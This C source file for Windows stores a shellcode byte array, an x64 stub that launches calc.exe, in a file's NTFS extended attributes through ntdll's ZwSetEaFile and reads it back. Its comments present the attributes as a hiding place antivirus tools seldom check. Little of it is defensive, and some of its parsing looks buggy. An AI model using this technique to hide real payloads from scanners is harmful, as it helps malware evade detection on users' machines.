// saves and retrieves data in a file's extended object buffer(?) 
// can be used for defense purposes to check wether a file contains extended objects
// I dont think many AV softwares regulary check this, should be a good hiding place

#include <stdio.h>
#include <windows.h>

unsigned char payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int payload_len = 276;


typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG  NextEntryOffset;
  UCHAR  Flags;
  UCHAR  EaNameLength;
  USHORT EaValueLength;
  CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID    Pointer;
  };
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef NTSTATUS (WINAPI * ZwSetEaFile_t)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length
);

typedef NTSTATUS (WINAPI * ZwQueryEaFile_t)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	BOOLEAN          ReturnSingleEntry,
	PVOID            EaList,
	ULONG            EaListLength,
	PULONG           EaIndex,
	BOOLEAN          RestartScan
);

ZwSetEaFile_t pZwSetEaFile;
ZwQueryEaFile_t pZwQueryEaFile;
HANDLE hFile;

int readEA() {
	
	DWORD getError;
	int numEntries;
	IO_STATUS_BLOCK io;
	
	ULONG  offset;
	UCHAR  flag;
	UCHAR  eaNameLength;
	USHORT eaValueLength;
	char * eaName;
	char * eaValue;
	
	
	char * buffer = (char *) malloc(0x100000);
	getError = pZwQueryEaFile( hFile, &io, (PFILE_FULL_EA_INFORMATION)buffer, 0x100000, FALSE, NULL, NULL, NULL, TRUE);	
	if(getError){
		printf("Couldn't read EA: %X\n", getError);
		return 1;
	}
	
	numEntries = 1;
	
	printf("%p\n", buffer);
	
	do {
		//manual parsing, just easier imo
		offset = (ULONG) *buffer;
		flag = (UCHAR) *(sizeof(ULONG) + buffer);
		eaNameLength = (UCHAR) *(sizeof(ULONG) + sizeof(UCHAR) + buffer);
		eaValueLength = (USHORT) *(sizeof(ULONG) + sizeof(UCHAR) + sizeof(UCHAR) + buffer);
		eaName = (sizeof(ULONG) + sizeof(UCHAR) + sizeof(UCHAR) + sizeof(USHORT) + buffer);
		eaValue = (sizeof(ULONG) + sizeof(UCHAR) + sizeof(UCHAR) + sizeof(USHORT) + eaNameLength + 1 + buffer);
		
		//printing values
		printf("Entry #%d\n", numEntries);
		printf("\tOffset: %X\n", offset);
		printf("\tFlag: %X\n", flag);
		printf("\tName length: %d\n", eaNameLength);
		printf("\tValue length: %d\n", eaValueLength);
		printf("\tName: %s\n", eaName);
		printf("\tValue: %s\n", eaValue);
		printf("\n");

		buffer = buffer + offset;
		numEntries++;
		
	} while ( offset != 0);
	
	getchar();
		
	return 0;
}

int writeEA( char * name, char * value) {
	
	DWORD setError;
	unsigned int nlen = strlen(name);
	unsigned int vlen = payload_len;//strlen(value);	
	printf("%d\n", 	payload_len);
	
	IO_STATUS_BLOCK io;
	FILE_FULL_EA_INFORMATION  ea;
	
	ea.NextEntryOffset = 0;
	ea.Flags = 0;
	ea.EaNameLength = nlen; //value without 0x
	ea.EaValueLength = vlen; //vlaue without 0x
	memcpy(ea.EaName, name, nlen + 1);
	memcpy(ea.EaName + nlen + 1, value, vlen);
	
	
	setError = pZwSetEaFile( hFile, &io, &ea, sizeof(FILE_FULL_EA_INFORMATION) + nlen + vlen + 1);
	if(setError){
		printf("Couldn't write EA: %X\n", setError);
		return 1;
	}
	return 0;
	
}

int main() {

	pZwSetEaFile = (ZwSetEaFile_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetEaFile");
	pZwQueryEaFile = (ZwQueryEaFile_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQueryEaFile");
	
	char * fileName = "xd";
	hFile = CreateFile( fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, 0, NULL );  
	if ( hFile == INVALID_HANDLE_VALUE ){
		printf("Cannot open file: %X \n", hFile);
		return 1;
	}
	
	writeEA("calc", (char *)payload);
	readEA();
	return 0;

}